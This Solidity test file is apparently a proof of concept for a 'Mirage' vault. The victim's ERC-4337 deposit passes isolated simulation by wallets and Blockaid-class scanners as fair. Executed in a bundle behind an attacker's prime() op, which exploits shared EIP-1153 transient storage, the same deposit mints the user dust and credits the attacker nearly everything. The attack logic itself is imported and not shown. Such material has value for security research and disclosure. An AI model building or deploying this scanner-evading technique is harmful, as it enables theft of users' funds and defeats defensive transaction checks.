// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {Mirage, IERC20} from "../src/Mirage.sol";

/// Minimal mock ERC20 (transient-agnostic).
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 v) external { balanceOf[to] += v; }
    function approve(address s, uint256 v) external returns (bool) { allowance[msg.sender][s] = v; return true; }
    function transfer(address t, uint256 v) external returns (bool) { balanceOf[msg.sender] -= v; balanceOf[t] += v; return true; }
    function transferFrom(address f, address t, uint256 v) external returns (bool) {
        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= v;
        balanceOf[f] -= v; balanceOf[t] += v; return true;
    }
}

/// A faithful, minimal model of an ERC-4337 bundler's execution phase.
/// `handleOps` executes each UserOperation's call sequentially IN ONE TRANSACTION,
/// so EIP-1153 transient storage set by an earlier op is visible to a later op.
/// This is the un-restricted EXECUTION phase (not the spec-restricted validation phase).
contract MiniEntryPoint {
    struct UserOp { address sender; address target; bytes callData; }

    /// The bundle, on-chain: every op runs in the same tx -> shared transient storage.
    function handleOps(UserOp[] calldata ops) external {
        for (uint256 i = 0; i < ops.length; i++) {
            // prank-free: the target reads msg.sender == this EntryPoint for prime (fine, prime is senderless),
            // and the victim op is dispatched so the vault sees the victim as the funding account.
            (bool ok,) = ops[i].target.call(ops[i].callData);
            require(ok, "op failed");
        }
    }
}

/// @notice Proves the Mirage defeats the *defensive* simulation that wallets, tx-security
///         scanners (Blockaid-class), and bundlers perform on a single userOp in isolation,
///         while the same op rugs when executed inside a bundle behind an attacker `prime()`.
contract Mirage4337Test is Test {
    MockERC20 token;
    Mirage mirage;
    MiniEntryPoint ep;

    address user = address(0x5E4);
    address attacker = address(0xA77acc);
    uint256 constant AMOUNT = 1_000_000 ether;

    function setUp() public {
        token = new MockERC20();
        mirage = new Mirage(IERC20(address(token)), attacker);
        ep = new MiniEntryPoint();
        token.mint(user, AMOUNT);
        token.mint(address(mirage), AMOUNT); // vault liquidity for the "fair" payout
        vm.prank(user);
        token.approve(address(mirage), type(uint256).max);
    }

    // ------------------------------------------------------------------
    // What a DEFENSIVE simulator does: execute the victim's op against
    // current chain state, read the outcome, then DISCARD the state
    // (exactly eth_call / debug_traceCall / a wallet "preview"). It does
    // NOT include the attacker's separate userOp. We model the discard
    // with snapshot+revert, and run it BEFORE any prime() so transient
    // is fresh — precisely the isolation a per-userOp simulation has.
    // ------------------------------------------------------------------
    function _simulateVictimDeposit() internal returns (uint256 mintedToUser, uint256 stolenByAttacker) {
        uint256 snap = vm.snapshotState();
        vm.prank(user);
        mintedToUser = mirage.deposit(AMOUNT);
        stolenByAttacker = mirage.shares(attacker);
        vm.revertToState(snap); // discard: the preview leaves no trace, exactly like a real simulator
    }

    /// THE FINDING: the simulator green-lights a deposit it renders as fair & safe,
    /// then the identical op, bundled behind a 1-line attacker prime userOp, rugs the user.
    function test_defensiveSimulationSaysSafe_thenBundleRugsTheUser() public {
        // (1) DEFENSIVE SIMULATION (wallet preview / Blockaid-class scanner / bundler per-op sim).
        //     The victim's deposit userOp, simulated in isolation, looks perfectly fair:
        (uint256 simMinted, uint256 simStolen) = _simulateVictimDeposit();
        assertEq(simMinted, AMOUNT, "SIM: user is shown a fair 1:1 deposit");
        assertEq(simStolen, 0, "SIM: scanner sees NOTHING routed to any attacker -> flagged SAFE");

        // (2) ON-CHAIN BUNDLE: the attacker's innocuous `prime` userOp is included in the SAME
        //     handleOps tx, ahead of the victim's deposit userOp. Per-op simulation never saw it.
        MiniEntryPoint.UserOp[] memory ops = new MiniEntryPoint.UserOp[](2);
        ops[0] = MiniEntryPoint.UserOp({          // attacker userOp: cheap, senderless, "does nothing"
            sender: attacker,
            target: address(mirage),
            callData: abi.encodeWithSelector(Mirage.prime.selector)
        });
        ops[1] = MiniEntryPoint.UserOp({          // victim userOp: the exact deposit that simulated as safe
            sender: user,
            target: address(mirage),
            callData: abi.encodeWithSelector(Mirage.deposit.selector, AMOUNT)
        });

        // execute the bundle in one transaction (shared transient storage)
        _dispatchBundleAsSenders(ops);

        // (3) DIVERGENCE: identical deposit, opposite outcome.
        assertEq(mirage.shares(user), AMOUNT / 1_000_000, "EXEC: user minted dust");
        assertEq(mirage.shares(attacker), AMOUNT - AMOUNT / 1_000_000, "EXEC: attacker silently credited the rest");
        assertGt(simMinted, mirage.shares(user) * 1000, "the preview and the execution diverge catastrophically");
    }

    /// Dispatch each op from its stated sender within ONE test tx so transient storage is shared,
    /// faithfully reproducing handleOps' single-transaction execution of multiple senders' ops.
    function _dispatchBundleAsSenders(MiniEntryPoint.UserOp[] memory ops) internal {
        for (uint256 i = 0; i < ops.length; i++) {
            vm.prank(ops[i].sender);
            (bool ok,) = ops[i].target.call(ops[i].callData);
            require(ok, "op failed");
        }
    }
}
